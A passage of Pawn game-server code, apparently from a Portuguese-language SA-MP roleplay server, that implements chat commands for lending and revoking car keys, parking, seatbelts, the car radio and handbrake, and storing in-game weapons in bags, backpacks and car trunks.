	if(!ProxDetectorS(8.0, playerid, giveplayerid)) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não estás perto do jogador");
	if(pInfo[giveplayerid][ChaveCarroEmp1] != car && pInfo[giveplayerid][ChaveCarroEmp2] != car && pInfo[giveplayerid][ChaveCarroEmp3] != car && pInfo[giveplayerid][ChaveCarroEmp4] != car) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Esse jogador não tem essa chave!");

	if(pInfo[giveplayerid][ChaveCarroEmp1] == car)
	{
	    pInfo[giveplayerid][ChaveCarroEmp1] = 0;
	}
	else if(pInfo[giveplayerid][ChaveCarroEmp2] == car)
	{
	    pInfo[giveplayerid][ChaveCarroEmp2] = 0;
	}
	else if(pInfo[giveplayerid][ChaveCarroEmp3] == car)
	{
	    pInfo[giveplayerid][ChaveCarroEmp3] = 0;
	}
	else if(pInfo[giveplayerid][ChaveCarroEmp4] == 0)
	{
	    pInfo[giveplayerid][ChaveCarroEmp4] = 0;
	}

	PlayerPlayerActionMessage(playerid, giveplayerid, 15.0, "retira uma chave a");

    format(string, sizeof(string), "Retiraste a chave do carro %d ao jogador %s", car, GetPlayerNameEx(giveplayerid));
    SendClientMessage(playerid, COLOR_INFO, string);
    format(string, sizeof(string), "O jogador %s retirou-te a chave do carro %d", GetPlayerNameEx(playerid), car);
    SendClientMessage(giveplayerid, COLOR_INFO, string);

	return 1;
}

COMMAND:emprestarchave(playerid, params[], help)
{
    if(!IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_ERRO, MSG_NOCAR);
    
    new car = GetPlayerVehicleID(playerid);
    
    if(cInfo[car][Type] != -1) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não podes dar a chave desse carro! Tipo inválido");
    if(pInfo[playerid][ChaveCarro1] != car && pInfo[playerid][ChaveCarro2] != car && pInfo[playerid][ChaveCarro3] != car && pInfo[playerid][ChaveCarro4] != car) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não és o dono desse carro!");

	new giveplayerid, string[128];
	
    if(sscanf(params, "d", giveplayerid)) return SendClientMessage(playerid, COLOR_CHAT, "[USO]: {FFFFFF}/emprestarchave <playerid>");
    if(!IsPlayerConnected(giveplayerid)) return SendClientMessage(playerid, COLOR_ERRO, MSG_NOTCONNECTED);
	if(!ProxDetectorS(8.0, playerid, giveplayerid)) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não estás perto do jogador");
	if(pInfo[giveplayerid][ChaveCarroEmp1] != 0 && pInfo[giveplayerid][ChaveCarroEmp2] != 0 && pInfo[giveplayerid][ChaveCarroEmp3] != 0 && pInfo[giveplayerid][ChaveCarroEmp4] != 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Esse jogador tem as chaves emprestadas todas usadas!");
	if(pInfo[giveplayerid][ChaveCarroEmp1] == car || pInfo[giveplayerid][ChaveCarroEmp2] == car || pInfo[giveplayerid][ChaveCarroEmp3] == car || pInfo[giveplayerid][ChaveCarroEmp4] == car) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Esse jogador já tem essa chave!");
	
	if(pInfo[giveplayerid][ChaveCarroEmp1] == 0)
	{
	    pInfo[giveplayerid][ChaveCarroEmp1] = car;
	}
	else if(pInfo[giveplayerid][ChaveCarroEmp2] == 0)
	{
	    pInfo[giveplayerid][ChaveCarroEmp2] = car;
	}
	else if(pInfo[giveplayerid][ChaveCarroEmp3] == 0)
	{
	    pInfo[giveplayerid][ChaveCarroEmp3] = car;
	}
	else if(pInfo[giveplayerid][ChaveCarroEmp4] == 0)
	{
	    pInfo[giveplayerid][ChaveCarroEmp4] = car;
	}
	
	PlayerPlayerActionMessage(playerid, giveplayerid, 15.0, "entrega uma chave a");

    format(string, sizeof(string), "Deste uma cópia da chave do carro %d ao jogador %s", car, GetPlayerNameEx(giveplayerid));
    SendClientMessage(playerid, COLOR_INFO, string);
    format(string, sizeof(string), "O jogador %s emprestou-te uma cópia da chave do carro %d", GetPlayerNameEx(playerid), car);
    SendClientMessage(giveplayerid, COLOR_INFO, string);

	return 1;
}

COMMAND:cinto(playerid, params[], help)
{
    if(!IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_ERRO, MSG_NOCAR);
    
	if(Cinto[playerid] == true)
	{
 		PlayerActionMessage(playerid, 15.0, "clica no botão e tira o cinto de segurança.");
 		Cinto[playerid] = false;
	}
	else
	{
 		PlayerActionMessage(playerid, 15.0, "coloca o cinto de segurança.");
 		Cinto[playerid] = true;
	}

	return 1;
}

COMMAND:estacionar(playerid, params[], help)
{
    if(!IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_ERRO, MSG_NOCAR);
    
    new car = GetPlayerVehicleID(playerid);
    new Float:cx, Float:cy, Float:cz, Float:angle, vw, interior, Float:hp;
    new engine, lights, alarm, doors, bonnet, boot, objective;

 	GetVehicleParamsEx(car,engine,lights,alarm,doors,bonnet,boot,objective);
 	
 	if(engine == 1) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Tens de desligar o motor para estacionares o carro!");
   	if(pInfo[playerid][ChaveCarro1] != car && pInfo[playerid][ChaveCarro2] != car && pInfo[playerid][ChaveCarro3] != car && pInfo[playerid][ChaveCarro4] != car && pInfo[playerid][ChaveCarroEmp1] != car && pInfo[playerid][ChaveCarroEmp2] != car && pInfo[playerid][ChaveCarroEmp3] != car && pInfo[playerid][ChaveCarroEmp4] != car)
	{
		SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não tens a chave desse veículo!");
		return 1;
	}

    GetVehicleHealth(car, hp);
    GetVehiclePos(car, cx,cy,cz);
    GetVehicleZAngle(car, angle);
    vw = GetPlayerVirtualWorld(playerid);
    interior = GetPlayerInterior(playerid);

	cInfo[car][X] = cx;
	cInfo[car][Y] = cy;
	cInfo[car][Z] = cz;
	cInfo[car][Angle] = angle;
	cInfo[car][VirtualWorld] = vw;
	cInfo[car][Interior] = interior;
	cInfo[car][Vida] = hp;

	GuardarCarro(car);
	DestroyVehicle(cInfo[car][ID]);

	cInfo[car][ID] = CreateVehicle(cInfo[car][Model], cInfo[car][X], cInfo[car][Y], cInfo[car][Z], cInfo[car][Angle], cInfo[car][Color1], cInfo[car][Color2], -1, IsACopCar(cInfo[car][Model]) ? 1 : 0);
	SetVehicleVirtualWorld(cInfo[car][ID], cInfo[car][VirtualWorld]);
	LinkVehicleToInterior(cInfo[car][ID], cInfo[car][Interior]);
	PutPlayerInVehicle(playerid, cInfo[car][ID], 0);
	AtualizarDanosCarro(car);
	AtualizarTunning(car); 
	
	SetVehicleHealth(car, hp);
	
	if(cInfo[car][IsCaravana] == 1 || cInfo[car][IsCaravana] == 2)
	{
		AtualizarCaravanaPos(car);
	}

    SendClientMessage(playerid, COLOR_INFO, "Estacionaste aqui o teu carro");

	return 1;
}

COMMAND:ligarradio(playerid, params[], help)
{
	if(IsPlayerInAnyVehicle(playerid))
	{
		new car = GetPlayerVehicleID(playerid);

		switch(cInfo[car][RadioStatus])
		{
		    case 0:
		    {
		        cInfo[car][RadioStatus] = 1;
		        SendClientMessage(playerid, COLOR_INFO, "Ligaste o rádio do carro");

		        PlayerActionMessage(playerid, 15.0, "clica no botão e liga o rádio");
		    }
		    case 1:
		    {
		        cInfo[car][RadioStatus] = 0;
		        SendClientMessage(playerid, COLOR_INFO, "Desligaste o rádio do carro");

			    foreach(new i : Player)
			    {
	                if(!IsPlayerInVehicle(i, car)) continue;
	                if(pObjects[i][Radio] == 1) continue;

	                StopAudioStreamForPlayer(i);
			    }

		        StopAudioStreamForPlayer(playerid);
		        PlayerActionMessage(playerid, 15.0, "clica no botão e desliga o rádio");
		    }
		}
	}
	else
	{
		if(pObjects[playerid][Radio] == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não estás tens nenhum rádio!");
		
		StopAudioStreamForPlayer(playerid);
		SendClientMessage(playerid, COLOR_INFO, "Desligaste a música que estava a passar!");
	}

	return 1;
}

COMMAND:travar(playerid, params[], help)
{
	if(!IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_ERRO, MSG_NOCAR);
	
	new speed = GetPlayerSpeed(playerid);
	new car = GetPlayerVehicleID(playerid);
	
	if(cInfo[car][Travao] == 0)
	{
		if(speed > 10) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não podes travar o carro, a tua velocidade é muito alta");
	    SetVehicleVelocity(car, 0.0, 0.0, 0.0);

	    PlayerTextDrawColor(playerid, TDEditor_PTD[playerid][3], COLOR_ERRO);
	    PlayerTextDrawShow(playerid, TDEditor_PTD[playerid][3]);
	    
	    PlayerActionMessage(playerid, 15.0, "puxa o travão de mão");
	    
	    cInfo[car][Travao] = 1;
	}
	else
	{
	    PlayerTextDrawColor(playerid, TDEditor_PTD[playerid][3], -1);
	    PlayerTextDrawShow(playerid, TDEditor_PTD[playerid][3]);
	    
	    PlayerActionMessage(playerid, 15.0, "destrava o veículo");
	
	    cInfo[car][Travao] = 0;
	}

	return 1;
}

COMMAND:verarmasmala(playerid, params[], help)
{
	if(pObjects[playerid][Mala] == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não tens nenhuma mala!");
	if(AUsarMala[playerid] == false) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não estás a usar a tua mala!");

	new string[128];

	format(string, sizeof(string), "{FF9900}Arma 1: {FFFFFF}%s {FF9900}Balas: {FFFFFF}%d", GetWeapName(pObjects[playerid][Arma1Mala]), pObjects[playerid][Ammo1Mala]);
	SendClientMessage(playerid, COLOR_CHAT, string);
	format(string, sizeof(string), "{FF9900}Arma 2: {FFFFFF}%s {FF9900}Balas: {FFFFFF}%d", GetWeapName(pObjects[playerid][Arma2Mala]), pObjects[playerid][Ammo2Mala]);
	SendClientMessage(playerid, COLOR_CHAT, string);
	format(string, sizeof(string), "{FF9900}Arma 3: {FFFFFF}%s {FF9900}Balas: {FFFFFF}%d", GetWeapName(pObjects[playerid][Arma3Mala]), pObjects[playerid][Ammo3Mala]);
	SendClientMessage(playerid, COLOR_WHITE, string);
	format(string, sizeof(string), "{FF9900}Arma 4: {FFFFFF}%s {FF9900}Balas: {FFFFFF}%d", GetWeapName(pObjects[playerid][Arma4Mala]), pObjects[playerid][Ammo4Mala]);
	SendClientMessage(playerid, COLOR_WHITE, string);

	return 1;
}

COMMAND:tirararmamala(playerid, params[], help)
{
	new slot, string[128];

    if(sscanf(params, "d", slot)) return SendClientMessage(playerid, COLOR_CHAT, "[USO]: {FFFFFF}/tirararmamala <slot (1-4)>");
    if(slot <= 0 || slot > 4) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Slot inválido!");
	if(pObjects[playerid][Mala] == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não tens nenhuma mala!");
	if(AUsarMala[playerid] == false) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não estás a usar a tua mala!");

	switch(slot)
	{
	    case 1:
	    {
	        if(pObjects[playerid][Arma1Mala] == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não tens nenhuma arma nesse slot");

	        GivePlayerWeapon(playerid, pObjects[playerid][Arma1Mala], pObjects[playerid][Ammo1Mala]);
	        format(string, sizeof(string), "Tiraste a arma %s (Slot:1) com %d de munição", GetWeapName(pObjects[playerid][Arma1Mala]),  pObjects[playerid][Ammo1Mala]);

	        pObjects[playerid][Arma1Mala] = 0;
	        pObjects[playerid][Ammo1Mala] = 0;
	    }
	    case 2:
	    {
	        if(pObjects[playerid][Ammo2Mala] == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não tens nenhuma arma nesse slot");

	        GivePlayerWeapon(playerid, pObjects[playerid][Arma2Mala], pObjects[playerid][Ammo2Mala]);
	        format(string, sizeof(string), "Tiraste a arma %s (Slot:2) com %d de munição", GetWeapName(pObjects[playerid][Arma2Mala]),  pObjects[playerid][Ammo2Mala]);

	        pObjects[playerid][Arma2Mala] = 0;
	        pObjects[playerid][Ammo2Mala] = 0;
	    }
	    case 3:
	    {
	        if(pObjects[playerid][Ammo3Mala] == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não tens nenhuma arma nesse slot");

	        GivePlayerWeapon(playerid, pObjects[playerid][Arma3Mala], pObjects[playerid][Ammo3Mala]);
	        format(string, sizeof(string), "Tiraste a arma %s (Slot:3) com %d de munição", GetWeapName(pObjects[playerid][Arma3Mala]),  pObjects[playerid][Ammo3Mala]);

	        pObjects[playerid][Arma3Mala] = 0;
	        pObjects[playerid][Ammo3Mala] = 0;
	    }
	    case 4:
	    {
	        if(pObjects[playerid][Ammo4Mala] == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não tens nenhuma arma nesse slot");

	        GivePlayerWeapon(playerid, pObjects[playerid][Arma4Mala], pObjects[playerid][Ammo4Mala]);
	        format(string, sizeof(string), "Tiraste a arma %s (Slot:4) com %d de munição", GetWeapName(pObjects[playerid][Arma4Mala]),  pObjects[playerid][Ammo4Mala]);

	        pObjects[playerid][Arma4Mala] = 0;
	        pObjects[playerid][Ammo4Mala] = 0;
	    }
	}

	PlayerActionMessage(playerid, 15.0, "tira uma arma de dentro da mala.");

	return 1;
}

COMMAND:porarmamala(playerid, params[], help)
{
	new slot, string[128];

    if(sscanf(params, "d", slot)) return SendClientMessage(playerid, COLOR_CHAT, "[USO]: {FFFFFF}/porarmamala <slot (1-4)>");
    if(slot <= 0 || slot > 4) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Slot inválido!");
	if(pObjects[playerid][Mala] == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não tens nenhuma mala!");
	if(AUsarMala[playerid] == false) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não estás a usar a tua mala!");

   	new arma = GetPlayerWeapon(playerid);
	new ammo = GetPlayerAmmo(playerid);

	if(arma == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Arma inválida");
	if(ammo == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Munição inválida");

	switch(slot)
	{
	    case 1:
	    {
			if(pObjects[playerid][Arma1Mala] != 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Esse slot já está a ser usado!");

			pObjects[playerid][Arma1Mala]  = arma;
			pObjects[playerid][Ammo1Mala]  = ammo;

			format(string, sizeof(string), "Colocaste a arma %s com %d balas no slot 1 da tua mala", GetWeapName(arma), ammo);
	    }
	    case 2:
	    {
			if(pObjects[playerid][Ammo2Mala] != 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Esse slot já está a ser usado!");

			pObjects[playerid][Arma2Mala]  = arma;
			pObjects[playerid][Ammo2Mala]  = ammo;

			format(string, sizeof(string), "Colocaste a arma %s com %d balas no slot 2 da tua mala", GetWeapName(arma), ammo);
	    }
	    case 3:
	    {
			if(pObjects[playerid][Ammo3Mala] != 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Esse slot já está a ser usado!");

			pObjects[playerid][Arma3Mala]  = arma;
			pObjects[playerid][Ammo3Mala]  = ammo;

			format(string, sizeof(string), "Colocaste a arma %s com %d balas no slot 3 da tua mala", GetWeapName(arma), ammo);
	    }
	    case 4:
	    {
			if(pObjects[playerid][Ammo4Mala] != 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Esse slot já está a ser usado!");

			pObjects[playerid][Arma4Mala]  = arma;
			pObjects[playerid][Ammo4Mala]  = ammo;

			format(string, sizeof(string), "Colocaste a arma %s com %d balas no slot 4 da tua mala", GetWeapName(arma), ammo);
	    }
	}

	SendClientMessage(playerid, COLOR_INFO, string);
	RemovePlayerWeapon(playerid, arma);

	PlayerActionMessage(playerid, 15.0, "põe uma arma na mala.");

	return 1;
}

COMMAND:porarmamochila(playerid, params[], help)
{
	new slot, string[128];

    if(sscanf(params, "d", slot)) return SendClientMessage(playerid, COLOR_CHAT, "[USO]: {FFFFFF}/porarmamochila <slot (1-4)>");
    if(slot <= 0 || slot > 4) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Slot inválido!");
	if(pObjects[playerid][Mochila] == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não tens nenhuma mochila!");
	if(AUsarMochila[playerid] == false) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não estás a usar a tua mochila!");

   	new arma = GetPlayerWeapon(playerid);
	new ammo = GetPlayerAmmo(playerid);

	if(arma == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Arma inválida");
	if(ammo == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Munição inválida");

	switch(slot)
	{
	    case 1:
	    {
			if(pObjects[playerid][Arma1Mochila] != 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Esse slot já está a ser usado!");

			pObjects[playerid][Arma1Mochila]  = arma;
			pObjects[playerid][Ammo1Mochila]  = ammo;

			format(string, sizeof(string), "Colocaste a arma %s com %d balas no slot 1 da tua mochila", GetWeapName(arma), ammo);
	    }
	    case 2:
	    {
			if(pObjects[playerid][Ammo2Mochila] != 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Esse slot já está a ser usado!");

			pObjects[playerid][Arma2Mochila]  = arma;
			pObjects[playerid][Ammo2Mochila]  = ammo;

			format(string, sizeof(string), "Colocaste a arma %s com %d balas no slot 2 da tua mochila", GetWeapName(arma), ammo);
	    }
	    case 3:
	    {
			if(pObjects[playerid][Ammo3Mochila] != 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Esse slot já está a ser usado!");

			pObjects[playerid][Arma3Mochila]  = arma;
			pObjects[playerid][Ammo3Mochila]  = ammo;

			format(string, sizeof(string), "Colocaste a arma %s com %d balas no slot 3 da tua mochila", GetWeapName(arma), ammo);
	    }
	    case 4:
	    {
			if(pObjects[playerid][Ammo4Mochila] != 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Esse slot já está a ser usado!");

			pObjects[playerid][Arma4Mochila]  = arma;
			pObjects[playerid][Ammo4Mochila]  = ammo;

			format(string, sizeof(string), "Colocaste a arma %s com %d balas no slot 4 da tua mochila", GetWeapName(arma), ammo);
	    }
	}

	SendClientMessage(playerid, COLOR_INFO, string);

	RemovePlayerWeapon(playerid, arma);
	PlayerActionMessage(playerid, 15.0, "põe uma arma na mochila.");

	return 1;
}

COMMAND:tirararmamochila(playerid, params[], help)
{
	new slot, string[128];

    if(sscanf(params, "d", slot)) return SendClientMessage(playerid, COLOR_CHAT, "[USO]: {FFFFFF}/tirararmamochila <slot (1-4)>");
    if(slot <= 0 || slot > 4) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Slot inválido!");
	if(pObjects[playerid][Mochila] == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não tens nenhuma mochila!");
	if(AUsarMochila[playerid] == false) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não estás a usar a tua mochila!");

	switch(slot)
	{
	    case 1:
	    {
	        if(pObjects[playerid][Arma1Mochila] == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não tens nenhuma arma nesse slot");

	        GivePlayerWeapon(playerid, pObjects[playerid][Arma1Mochila], pObjects[playerid][Ammo1Mochila]);
	        format(string, sizeof(string), "Tiraste a arma %s (Slot:1) com %d de munição", GetWeapName(pObjects[playerid][Arma1Mochila]),  pObjects[playerid][Ammo1Mochila]);

	        pObjects[playerid][Arma1Mochila] = 0;
	        pObjects[playerid][Ammo1Mochila] = 0;
	    }
	    case 2:
	    {
	        if(pObjects[playerid][Ammo2Mochila] == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não tens nenhuma arma nesse slot");

	        GivePlayerWeapon(playerid, pObjects[playerid][Arma2Mochila], pObjects[playerid][Ammo2Mochila]);
	        format(string, sizeof(string), "Tiraste a arma %s (Slot:2) com %d de munição", GetWeapName(pObjects[playerid][Arma2Mochila]),  pObjects[playerid][Ammo2Mochila]);

	        pObjects[playerid][Arma2Mochila] = 0;
	        pObjects[playerid][Ammo2Mochila] = 0;
	    }
	    case 3:
	    {
	        if(pObjects[playerid][Ammo3Mochila] == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não tens nenhuma arma nesse slot");

	        GivePlayerWeapon(playerid, pObjects[playerid][Arma3Mochila], pObjects[playerid][Ammo3Mochila]);
	        format(string, sizeof(string), "Tiraste a arma %s (Slot:3) com %d de munição", GetWeapName(pObjects[playerid][Arma3Mochila]),  pObjects[playerid][Ammo3Mochila]);

	        pObjects[playerid][Arma3Mochila] = 0;
	        pObjects[playerid][Ammo3Mochila] = 0;
	    }
	    case 4:
	    {
	        if(pObjects[playerid][Ammo4Mochila] == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não tens nenhuma arma nesse slot");

	        GivePlayerWeapon(playerid, pObjects[playerid][Arma4Mochila], pObjects[playerid][Ammo4Mochila]);
	        format(string, sizeof(string), "Tiraste a arma %s (Slot:4) com %d de munição", GetWeapName(pObjects[playerid][Arma4Mochila]),  pObjects[playerid][Ammo4Mochila]);

	        pObjects[playerid][Arma4Mochila] = 0;
	        pObjects[playerid][Ammo4Mochila] = 0;
	    }
	}

	PlayerActionMessage(playerid, 15.0, "tira uma arma de dentro da mochila.");

	return 1;
}

COMMAND:verarmasmochila(playerid, params[], help)
{
	if(pObjects[playerid][Mochila] == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não tens nenhuma mochila!");
	if(AUsarMochila[playerid] == false) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não estás a usar a tua mochila!");

	new string[128];

	format(string, sizeof(string), "{FF9900}Arma 1: {FFFFFF}%s {FF9900}Balas: {FFFFFF}%d", GetWeapName(pObjects[playerid][Arma1Mochila]), pObjects[playerid][Ammo1Mochila]);
	SendClientMessage(playerid, COLOR_CHAT, string);
	format(string, sizeof(string), "{FF9900}Arma 2: {FFFFFF}%s {FF9900}Balas: {FFFFFF}%d", GetWeapName(pObjects[playerid][Arma2Mochila]), pObjects[playerid][Ammo2Mochila]);
	SendClientMessage(playerid, COLOR_CHAT, string);
	format(string, sizeof(string), "{FF9900}Arma 3: {FFFFFF}%s {FF9900}Balas: {FFFFFF}%d", GetWeapName(pObjects[playerid][Arma3Mochila]), pObjects[playerid][Ammo3Mochila]);
	SendClientMessage(playerid, COLOR_WHITE, string);
	format(string, sizeof(string), "{FF9900}Arma 4: {FFFFFF}%s {FF9900}Balas: {FFFFFF}%d", GetWeapName(pObjects[playerid][Arma4Mochila]), pObjects[playerid][Ammo4Mochila]);
	SendClientMessage(playerid, COLOR_WHITE, string);

	return 1;
}

COMMAND:verarmascarro(playerid, params[], help)
{
    new mot, lu, alar, por, cap, porma, ob;
    new car = FindClosestVehicle(playerid);

	if(car == INVALID_VEHICLE_ID) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não estás perto de nenhum veículo!");

	GetVehicleParamsEx(car, mot, lu, alar, por, cap, porma, ob);

	if(porma == VEHICLE_PARAMS_OFF) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}A bagageira está fechada!");
	
	new string[128];
	
	format(string, sizeof(string), "{FF9900}Arma 1: {FFFFFF}%s {FF9900}Balas: {FFFFFF}%d", GetWeapName(cInfo[car][Arma1]), cInfo[car][Ammo1]);
	SendClientMessage(playerid, COLOR_CHAT, string);
	format(string, sizeof(string), "{FF9900}Arma 2: {FFFFFF}%s {FF9900}Balas: {FFFFFF}%d", GetWeapName(cInfo[car][Arma2]), cInfo[car][Ammo2]);
	SendClientMessage(playerid, COLOR_CHAT, string);
	format(string, sizeof(string), "{FF9900}Arma 3: {FFFFFF}%s {FF9900}Balas: {FFFFFF}%d", GetWeapName(cInfo[car][Arma3]), cInfo[car][Ammo3]);
	SendClientMessage(playerid, COLOR_WHITE, string);
	
	return 1;
}

COMMAND:tirararmacarro(playerid, params[], help)
{
    new mot, lu, alar, por, cap, porma, ob;
    new car = FindClosestVehicle(playerid);

	if(car == INVALID_VEHICLE_ID) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não estás perto de nenhum veículo!");

	GetVehicleParamsEx(car, mot, lu, alar, por, cap, porma, ob);

	if(porma == VEHICLE_PARAMS_OFF) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}A bagageira está fechada!");
	
	new slot, string[128];

    if(sscanf(params, "d", slot)) return SendClientMessage(playerid, COLOR_CHAT, "[USO]: {FFFFFF}/tirararmacarro <slot (1-3)>");
    if(slot <= 0 || slot > 3) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Slot inválido!");
    
	switch(slot)
	{
	    case 1:
	    {
	        if(cInfo[car][Ammo1] == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não tens nenhuma arma nesse slot");

	        GivePlayerWeapon(playerid, cInfo[car][Arma1], cInfo[car][Ammo1]);
	        format(string, sizeof(string), "Tiraste a arma %s (Slot:1) com %d de munição", GetWeapName(cInfo[car][Arma1]), cInfo[car][Ammo1]);

	        cInfo[car][Arma1] = 0;
	        cInfo[car][Ammo1] = 0;
	    }
	    case 2:
	    {
	        if(cInfo[car][Ammo2] == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não tens nenhuma arma nesse slot");

	        GivePlayerWeapon(playerid, cInfo[car][Arma2], cInfo[car][Ammo2]);
	        format(string, sizeof(string), "Tiraste a arma %s (Slot:2) com %d de munição", GetWeapName(cInfo[car][Arma2]), cInfo[car][Ammo2]);

	        cInfo[car][Arma2] = 0;
	        cInfo[car][Ammo2] = 0;
	    }
	    case 3:
	    {
	        if(cInfo[car][Ammo3] == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não tens nenhuma arma nesse slot");

	        GivePlayerWeapon(playerid, cInfo[car][Arma3], cInfo[car][Ammo3]);
	        format(string, sizeof(string), "Tiraste a arma %s (Slot:3) com %d de munição", GetWeapName(cInfo[car][Arma3]), cInfo[car][Ammo3]);

	        cInfo[car][Arma3] = 0;
	        cInfo[car][Ammo3] = 0;
	    }
	}

	PlayerActionMessage(playerid, 15.0, "tira uma arma de dentro da bagageira.");
	
	return 1;
}

COMMAND:porarmacarro(playerid, params[], help)
{
    new mot, lu, alar, por, cap, porma, ob;
    new car = FindClosestVehicle(playerid);

	if(car == INVALID_VEHICLE_ID) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não estás perto de nenhum veículo!");

	GetVehicleParamsEx(car, mot, lu, alar, por, cap, porma, ob);

	if(porma == VEHICLE_PARAMS_OFF) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}A bagageira está fechada!");
	
	new slot, string[128];

    if(sscanf(params, "d", slot)) return SendClientMessage(playerid, COLOR_CHAT, "[USO]: {FFFFFF}/porarmacarro <slot (1-3)>");
    if(slot <= 0 || slot > 3) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Slot inválido!");
    
   	new arma = GetPlayerWeapon(playerid);
	new ammo = GetPlayerAmmo(playerid);
	
	if(arma == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Arma inválida");
	if(ammo == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Munição inválida");

	switch(slot)
	{
	    case 1:
	    {
			if(cInfo[car][Ammo1] != 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Esse slot já está a ser usado!");
			
			cInfo[car][Arma1] = arma;
			cInfo[car][Ammo1] = ammo;
			
			format(string, sizeof(string), "Colocaste a arma %s com %d balas no slot 1 do teu carro", GetWeapName(arma), ammo);
	    }
	    case 2:
	    {
			if(cInfo[car][Ammo2] != 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Esse slot já está a ser usado!");

			cInfo[car][Arma2] = arma;
			cInfo[car][Ammo2] = ammo;
			
			format(string, sizeof(string), "Colocaste a arma %s com %d balas no slot 2 do teu carro", GetWeapName(arma), ammo);
	    }
	    case 3:
	    {
			if(cInfo[car][Ammo3] != 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Esse slot já está a ser usado!");

			cInfo[car][Arma3] = arma;
			cInfo[car][Ammo3] = ammo;
			
			format(string, sizeof(string), "Colocaste a arma %s com %d balas no slot 3 do teu carro", GetWeapName(arma), ammo);
	    }
	}
	
	SendClientMessage(playerid, COLOR_INFO, string);
	
	RemovePlayerWeapon(playerid, arma);

	PlayerActionMessage(playerid, 15.0, "põe uma arma na bagageira do carro.");
	
	return 1;
}

COMMAND:bagageira(playerid, params[], help)
{
	new mot, lu, alar, por, cap, porma, ob;

